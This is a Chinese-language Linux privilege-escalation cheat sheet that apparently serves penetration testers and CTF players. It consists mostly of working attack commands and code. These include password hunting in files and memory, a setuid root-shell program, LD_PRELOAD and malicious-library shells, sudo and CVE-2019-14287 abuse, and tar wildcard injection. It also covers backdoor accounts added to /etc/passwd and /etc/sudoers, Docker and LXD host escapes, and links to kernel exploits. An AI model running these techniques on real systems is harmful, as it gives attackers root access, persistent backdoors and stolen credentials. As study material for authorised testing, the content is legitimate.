# Linux - 提权

## 摘要

* [工具](#tools)
* [核对表](#checklists)
* [搜寻密码](#looting-for-passwords)
    * [包含密码的文件](#files-containing-passwords)
    * [/etc/security/opasswd 中的旧密码](#old-passwords-in-etcsecurityopasswd)
    * [最后编辑的文件](#last-edited-files)
    * [内存中的密码](#in-memory-passwords)
    * [查找敏感文件](#find-sensitive-files)
* [SSH 密钥](#ssh-key)
    * [敏感文件](#sensitive-files)
    * [SSH 密钥可预测 PRNG (Authorized_Keys) 过程](#ssh-key-predictable-prng-authorized_keys-process)
* [计划任务](#scheduled-tasks)
    * [Cron 作业](#cron-jobs)
    * [Systemd 定时器](#systemd-timers)
* [SUID](#suid)
    * [查找 SUID 二进制文件](#find-suid-binaries)
    * [创建一个 SUID 二进制文件](#create-a-suid-binary)
* [Capabilities (能力)](#capabilities)
    * [列出二进制文件的 Capabilities](#list-capabilities-of-binaries)
    * [编辑 Capabilities](#edit-capabilities)
    * [有趣的 Capabilities](#interesting-capabilities)
* [SUDO](#sudo)
    * [NOPASSWD](#nopasswd)
    * [LD_PRELOAD 和 NOPASSWD](#ld_preload-and-nopasswd)
    * [Doas](#doas)
    * [sudo_inject](#sudo_inject)
    * [CVE-2019-14287](#cve-2019-14287)
* [GTFOBins](#gtfobins)
* [通配符](#wildcard)
* [可写文件](#writable-files)
    * [可写的 /etc/passwd](#writable-etcpasswd)
    * [可写的 /etc/sudoers](#writable-etcsudoers)
* [NFS Root Squashing (根用户压制)](#nfs-root-squashing)
* [共享库](#shared-library)
    * [ldconfig](#ldconfig)
    * [RPATH](#rpath)
* [用户组](#groups)
    * [Docker](#docker)
    * [LXC/LXD](#lxclxd)
* [劫持 TMUX 会话](#hijack-tmux-session)
* [内核漏洞利用](#kernel-exploits)
    * [CVE-2022-0847 (DirtyPipe)](#cve-2022-0847-dirtypipe)
    * [CVE-2016-5195 (DirtyCow)](#cve-2016-5195-dirtycow)
    * [CVE-2010-3904 (RDS)](#cve-2010-3904-rds)
    * [CVE-2010-4258 (Full Nelson)](#cve-2010-4258-full-nelson)
    * [CVE-2012-0056 (Mempodipper)](#cve-2012-0056-mempodipper)

## 工具

有许多脚本可以在 Linux 机器上执行，以自动枚举系统信息、进程和文件，从而定位提权向量。
以下是一些常用的工具：

* [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    ```powershell
    wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
    curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
    ./linpeas.sh -a # 所有检查 - 进行更深层的系统枚举，但耗时较长。
    ./linpeas.sh -s # 超快且隐蔽模式 - 将跳过一些耗时的检查。在隐蔽模式下，不会向磁盘写入任何内容。
    ./linpeas.sh -P # 密码 - 提供用于 sudo -l 和暴力破解其他用户的密码。
    ```

* [LinuxSmartEnumeration - 用于渗透测试和 CTF 的 Linux 枚举工具](https://github.com/diego-treitos/linux-smart-enumeration)

    ```powershell
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
    ./lse.sh -l1 # 显示有助于提权的有趣信息
    ./lse.sh -l2 # 转储其收集的所有关于系统的信息
    ```

* [LinEnum - 脚本化的本地 Linux 枚举与提权检查](https://github.com/rebootuser/LinEnum)

    ```powershell
    ./LinEnum.sh -s -k 关键词 -r 报告 -e /tmp/ -t
    ```

* [BeRoot - 提权项目 - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [linuxprivchecker.py - 一个 Linux 提权检查脚本](https://github.com/sleventyeleven/linuxprivchecker)
* [unix-privesc-check - 自动从 code.google.com/p/unix-privesc-check 导出](https://github.com/pentestmonkey/unix-privesc-check)
* [通过 sudo 进行提权 - Linux](https://github.com/TH3xACE/SUDO_KILLER)

## 核对表 (Checklists)

* 内核与发行版发布详情
* 系统信息：
    * 主机名
    * 网络详情：
    * 当前 IP
    * 默认路由详情
    * DNS 服务器信息
* 用户信息：
    * 当前用户详情
    * 最后登录的用户
    * 显示当前登录主机的用户
    * 列出所有用户（包括 uid/gid 信息）
    * 列出 root 账户
    * 提取密码策略和哈希存储方法信息
    * 检查 umask 值
    * 检查密码哈希是否存储在 /etc/passwd 中
    * 提取 “默认” uid（如 0, 1000, 1001 等）的完整详情
    * 尝试读取受限文件（即 /etc/shadow）
    * 列出当前用户的历史文件（即 .bash_history, .nano_history, .mysql_history 等）
    * 基本 SSH 检查
* 特权访问：
    * 哪些用户最近使用了 sudo
    * 确定 /etc/sudoers 是否可访问
    * 确定当前用户是否拥有无密码的 Sudo 访问权限
    * 是否可以通过 Sudo 使用已知的 “良好” 跳出二进制文件（即 nmap, vim 等）
    * root 的家目录是否可访问
    * 列出 /home/ 的权限
* 环境：
    * 显示当前的 $PATH
    * 显示 env 信息
* 任务/作业：
    * 列出所有 cron 作业
    * 查找所有全局可写的 cron 作业
    * 查找系统其他用户拥有的 cron 作业
    * 列出活动和非活动的 systemd 定时器
* 服务：
    * 列出网络连接 (TCP & UDP)
    * 列出运行中的进程
    * 查找并列出进程的可执行二进制文件及其关联权限
    * 列出 inetd.conf/xined.conf 的内容及关联的二进制文件权限
    * 列出 init.d 二进制文件权限
* 版本信息 (以下各顶):
    * Sudo
    * MYSQL
    * Postgres
    * Apache
        * 检查用户配置
        * 显示已启用的模块
        * 检查 htpasswd 文件
        * 查看 www 目录
* 默认/弱凭据：
    * 检查默认/弱密码的 Postgres 账户
    * 检查默认/弱密码的 MYSQL 账户
* 搜索：
    * 查找所有的 SUID/GUID 文件
    * 查找所有的全局可写 SUID/GUID 文件
    * 查找 root 拥有的所有 SUID/GUID 文件
    * 查找 “有趣” 的 SUID/GUID 文件 (即 nmap, vim 等)
    * 查找带有 POSIX capabilities 的文件
    * 列出所有全局可写文件
    * 查找/列出所有可访问的 *.plan 文件并显示内容
    * 查找/列出所有可访问的 *.rhosts 文件并显示内容
    * 显示 NFS 服务器详情
    * 查找包含脚本运行时提供的关键词的 *.conf 和 *.log 文件
    * 列出 /etc 中的所有 *.conf 文件
    * 定位邮件 (mail)
* 平台/软件特定测试：
    * 检查确认我们是否在 Docker 容器中
    * 检查主机是否安装了 Docker
    * 检查确认我们是否在 LXC 容器中

## 搜寻密码

### 包含密码的文件

```powershell
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

### /etc/security/opasswd 中的旧密码

`/etc/security/opasswd` 文件也被 pam_cracklib 用于保存旧密码的历史记录，以便用户不会重复使用它们。

:warning: 像对待 /etc/shadow 文件一样对待你的 opasswd 文件，因为它包含用户密码哈希。

### 最后编辑的文件

过去 10 分钟内编辑过的文件

```powershell
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

### 内存中的密码

**内存**:

```powershell
strings /dev/mem -n10 | grep -i PASS
```

**核心转储 (Core Dump)**:

```ps1
# 查找 PID
ps -eo pid,command

# 核心转储 PID
gcore <pid> -o dumpfile

# 搜索密码
strings -n 5 dumpfile | grep -i pass
```

### 查找敏感文件

```powershell
$ locate password | more           
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...
```

### Preseed

在基于 Debian 的 Linux 发行版中，preseed.cfg 文件用于自动化安装过程。它包含安装程序通常会问的问题的答案，从而实现完全无人值守的安装。此文件可以指定分区方案、软件包选择、网络设置和用户账户等配置。

* 明文形式的 root 密码

  ```ps1
  d-i passwd/root-password password root_password_123
  d-i passwd/root-password-again password root_password_123
  ```

* 使用 MD5 哈希加密的 root 密码

  ```ps1
  d-i passwd/root-password-crypted password $1$DhSfFtNS$v/Eb.KsQkTq8nKIX1.B8n.
  ```

* 明文形式的普通用户密码

  ```ps1
  d-i passwd/user-password password my_password_123
  d-i passwd/user-password-again password my_password_123
  ```

* 使用 MD5 哈希加密的普通用户密码

  ```ps1
  d-i passwd/user-password-crypted password $1$DgJMNO1/$BqfY2C5y00p0yhpApPmmJ1
  ```

## SSH 密钥

### 敏感文件

```ps1
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

### SSH 密钥可预测 PRNG (Authorized_Keys) 过程

本模块描述了如何尝试在目标系统上使用获取到的 authorized_keys 文件。

所需内容：来自 authorized_keys 文件的 SSH-DSS 字符串

**步骤**

获取 authorized_keys 文件。该文件示例如下：

```ps1
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (已截断) ... 
```

由于这是一个 ssh-dss 密钥，我们需要将其添加到本地的 `/etc/ssh/ssh_config` 和 `/etc/ssh/sshd_config` 中：

```ps1
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config
/etc/init.d/ssh restart
```

获取 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) 并解压密钥：

```ps1
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

从上面显示的密钥文件中以 `"AAAA..."` 部分开始获取前 20 或 30 个字节，并使用它对解压后的密钥进行 grep 搜索：

```ps1
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

如果成功，这将返回一个公钥文件 (68b329da9893e34099c7d8ad5cb9c940-17934.pub)。要使用私钥文件进行连接，请移除 '.pub' 后缀并执行：

```ps1
ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
```

你应该可以在不需要密码的情况下连接。如果卡住了，`-vvv` 详细选项应能提供失败原因的消息详情。

## 计划任务

### Cron 作业

检查你是否对这些文件具有写权限。
检查文件内容，以查找其他具有写权限的路径。

```powershell
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

你可以使用 [DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) 来检测 CRON 作业。

```powershell
# 每 1000 毫秒 (=1秒) 打印命令和文件系统事件并扫描 procfs
./pspy64 -pf -i 1000 
```

## Systemd 定时器

```powershell
systemctl list-timers --all
NEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES
Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

列出了 3 个定时器。
```

## SUID

SUID/Setuid 代表 “执行时设置用户 ID”，在每个 Linux 发行版中默认启用。如果运行带有此标志的文件，uid 将更改为所有者的 uid。如果文件所有者是 `root`，即使是从用户 `bob` 执行，uid 也会更改为 `root`。SUID 标志由 `s` 表示。

```powershell
╭─swissky@lab ~  
╰─$ ls /usr/bin/sudo -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```

### 查找 SUID 二进制文件

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

### 创建一个 SUID 二进制文件

| 函数 | 描述 |
|------------|---|
| setreuid() | 设置调用进程的真实及有效用户 ID |
| setuid() | 设置调用进程的有效用户 ID |
| setgid() | 设置调用进程的有效组 ID |

```bash
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # 执行权限
sudo chmod +s /tmp/suid # setuid 标志
```

## Capabilities (能力)

### 列出二进制文件的 Capabilities

```powershell
╭–swissky@lab ~  
╰–$ /usr/bin/getcap -r /usr/bin
/usr/bin/fping                = cap_net_raw+ep
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

### 编辑 Capabilities

```powershell
/usr/bin/setcap -r /bin/ping            # 移除
/usr/bin/setcap cap_net_raw+p /bin/ping # 添加
```

### 有趣的 Capabilities

具有 `capability =ep` 意味着该二进制文件拥有所有 capabilities。

```powershell
$ getcap openssl /usr/bin/openssl 
openssl=ep
```

或者，可以使用以下 capabilities 来提升你当前的特权。

```powershell
cap_dac_read_search # 读取任何内容
cap_setuid+ep # setuid
```

使用 `cap_setuid+ep` 进行提权的示例

```powershell
$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sh-5.0# id
uid=0(root) gid=1000(swissky)
```

| Capabilities 名称 | 描述 |
|---|---|
| CAP_AUDIT_CONTROL | 允许启用/禁用内核审计 |
| CAP_AUDIT_WRITE | 有助于向内核审计日志写入记录 |
| CAP_BLOCK_SUSPEND | 此功能可以阻止系统挂起 |
| CAP_CHOWN | 允许用户任意更改文件的 UID 和 GID |
| CAP_DAC_OVERRIDE | 这有助于绕过文件的读取、写入和执行权限检查 |
| CAP_DAC_READ_SEARCH | 这仅绕过文件和目录的读取/执行权限检查 |
| CAP_FOWNER | 这可以绕过对通常需要进程的系统 UID 与文件 UID 匹配的操作的权限检查 |
| CAP_KILL | 允许向属于他人的进程发送信号 |
| CAP_SETGID | 允许更改 GID |
| CAP_SETUID | 允许更改 UID |
| CAP_SETPCAP | 有助于将当前集合传输和从任何 PID 移除 |
| CAP_IPC_LOCK | 这有助于锁定内存 |
| CAP_MAC_ADMIN | 允许 MAC 配置或状态更改 |
| CAP_NET_RAW | 使用 RAW 和 PACKET 套接字 |
| CAP_NET_BIND_SERVICE | SERVICE 将套接字绑定到 Internet 域特权端口 |

## SUDO

工具: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)

### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以另一个用户的权限执行某些命令。

```bash
$ sudo -l

用户 demo 可以在 crashlab 上运行以下命令：
    (root) NOPASSWD: /usr/bin/vim
```

在此示例中，用户 `demo` 可以以 `root` 权限运行 `vim`，现在通过在 root 目录中添加 SSH 密钥或通过调用 `sh` 来获取 shell 非常简单。

```bash
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```

### LD_PRELOAD 和 NOPASSWD

如果 `LD_PRELOAD` 在 sudoers 文件中显式定义

```powershell
Defaults        env_keep += LD_PRELOAD
```

使用以下 C 代码编译生成的共享对象：`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/sh");
}
```

使用 LD_PRELOAD 执行任何二进制文件以产出一个 shell：`sudo LD_PRELOAD=<so_文件的完整路径> <程序名>`，例如：`sudo LD_PRELOAD=/tmp/shell.so find`

### Doas

对于 OpenBSD，有一些 `sudo` 二进制文件的替代品，如 `doas`，记得检查其配置文件 `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
```

### sudo_inject

使用 [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```powershell
$ sudo <任何命令>
[sudo] password for user:    
# 因为你没有密码，请按 <ctrl>+c。
# 这会创建无效的 sudo 令牌。
$ sh exploit.sh
.... 等待 1 秒
$ sudo -i # 不需要密码 :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

展示幻灯片：[https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

### CVE-2019-14287

```powershell
# 当用户拥有以下权限 (sudo -l) 时可利用
(ALL, !root) ALL

# 如果你有完整的 TTY，可以这样利用
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

## GTFOBins

[GTFOBins](https://gtfobins.github.io) 是一个精心挑选的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。

该项目收集了 Unix 二进制文件的合法功能，这些功能可以被滥用来跳出受限 shell、提升或维持特权、传输文件、产生绑定及反向 shell，以及促进其他后期利用任务。

> gdb -nx -ex '!sh' -ex quit
> sudo mysql -e '\! /bin/sh'
> strace -o /dev/null /bin/sh
> sudo awk 'BEGIN {system("/bin/sh")}'

## 通配符 (Wildcard)

通过使用带 –checkpoint-action 选项的 tar，可以在检查点后使用指定的动作。此动作可能是一个恶意 shell 脚本，可用于在启动 tar 的用户下执行任意命令。“诱导” root 使用特定选项非常容易，这就是通配符派上用场的地方。

```powershell
# 创建用于利用的文件
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# 有漏洞的脚本
tar cf archive.tar *
```

工具: [wildpwn](https://github.com/localh0t/wildpwn)

## 可写文件

列出系统上的全局可写文件。

```powershell
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
find / -perm -2 -type f 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### 可写的 /etc/sysconfig/network-scripts/ (Centos/Redhat)

例如 /etc/sysconfig/network-scripts/ifcfg-1337

```powershell
NAME=Network /bin/id  &lt;= 注意中间的空格
ONBOOT=yes
DEVICE=eth0

执行:
./etc/sysconfig/network-scripts/ifcfg-1337
```

来源: [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

### 可写的 /etc/passwd

首先使用以下命令之一生成密码。

```powershell
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

然后添加用户 `hacker` 并添加生成的密码。

```powershell
hacker:在此处放置生成的密码:0:0:Hacker:/root:/bin/bash
```

例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令和 `hacker:hacker` 登录。

或者，你可以使用以下几行代码添加一个没有密码的伪造用户。
警告：你可能会降低机器当前的安全性。

```powershell
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注意：在 BSD 平台中，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，此外 `/etc/shadow` 更名为 `/etc/spwd.db`。

### 可写的 /etc/sudoers

```powershell
echo "用户名 ALL=(ALL:ALL) ALL">>/etc/sudoers

# 无需密码使用 SUDO
echo "用户名 ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "用户名 ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

## NFS Root Squashing (根用户压制)

当 **no_root_squash** 出现在 `/etc/exports` 中时，该文件夹是可共享的，远程用户可以挂载它。

```powershell
# 远程检查文件夹名称
showmount -e 10.10.10.10

# 创建目录
mkdir /tmp/nfsdir  

# 挂载目录
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# 复制所需的 shell 
cp /bin/bash .  

# 设置 suid 权限
chmod +s bash  
```

## 共享库

### ldconfig

使用 `ldd` 识别共享库

```powershell
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
```

在 `/tmp` 中创建一个库并激活路径。

```powershell
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
/opt/binary
```

### RPATH

```powershell
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     共享库: [libc.so.6]
 0x0000000f (RPATH)                      库 rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

通过将库复制到 `/var/tmp/flag15/` 中，它将如 `RPATH` 变量所指定的那样在程序中被使用。

```powershell
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

然后在 `/var/tmp` 中创建一个恶意库：`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```powershell
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## 用户组

### Docker

在 bash 容器中挂载文件系统，允许你以 root 身份编辑 `/etc/passwd`，然后添加后门账户 `toor:password`。

```bash
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
```

基本类似，但你还将看到主机上运行的所有进程并连接到相同的网卡。

```powershell
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

或者使用来自 [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) 的 Docker 镜像来产生 root shell

```powershell
$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
...
正在下载更新的镜像 chrisfosterelli/rootplease:latest

你应该已经在宿主 OS 上拥有了一个 root shell
按 Ctrl-D 退出 docker 实例 / shell

sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

更多使用 Docker Socket 进行提权的技巧。

```powershell
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### LXC/LXD

提权需要运行一个具有高特权的容器，并将主机的根文件系统挂载到其中。

```powershell
╭–swissky@lab ~  
╰–$ id
uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
```

构建一个 Alpine 镜像并使用 `security.privileged=true` 标志启动它，强制容器作为 root 与主机文件系统交互。

```powershell
# 构建一个简单的 alpine 镜像
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# 导入镜像
lxc image import ./alpine.tar.gz --alias myimage

# 运行镜像
lxc init myimage mycontainer -c security.privileged=true

# 将 / 挂载到镜像中
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# 与容器交互
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

另外可参考 <https://github.com/initstring/lxd_root>

## 劫持 TMUX 会话

要求对 tmux 套接字具有读取访问权：`/tmp/tmux-1000/default`。

```powershell
export TMUX=/tmp/tmux-1000/default,1234,0 
tmux ls
```

## 内核漏洞利用

在这些仓库中可以找到编译好的利用程序，运行它们风险自负！

* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

已知效果良好的利用程序如下。可以使用 `searchsploit -w linux kernel centos` 搜索更多利用程序。

查找内核利用程序的另一种方法是通过执行 `uname -a` 获取机器的具体内核版本和 Linux 发行版。
复制内核版本和发行版，并在 Google 或 <https://www.exploit-db.com/> 中进行搜索。

### CVE-2022-0847 (DirtyPipe)

Linux 提权 - Linux 内核理论版本 5.8 < 5.16.11

* [Lance Biggerstaff/2022-0847](https://www.exploit-db.com/exploits/50808)

### CVE-2016-5195 (DirtyCow 脏牛漏洞)

Linux 提权 - Linux 内核 <= 3.19.0-73.8

```powershell
# 使 dirtycow 稳定
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

Linux RDS 漏洞利用 - Linux 内核 <= 2.6.36-rc8

```powershell
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

Linux 内核 2.6.37 (RedHat / Ubuntu 10.04)

```powershell
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

Linux 内核 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

```powershell
https://www.exploit-db.com/exploits/18411
```

## 参考资料

* [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
* [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
* [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
* [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
* [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
* [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
* [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
* [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
* [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
* [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
* [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
* [The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)
* [Setting the root password in preseed.cfg for unattended installation - Sebest - Mar 31, 2010](https://sebest.github.io/post/setting-the-root-password-in-preseed-cfg-for-unattended-installation/)
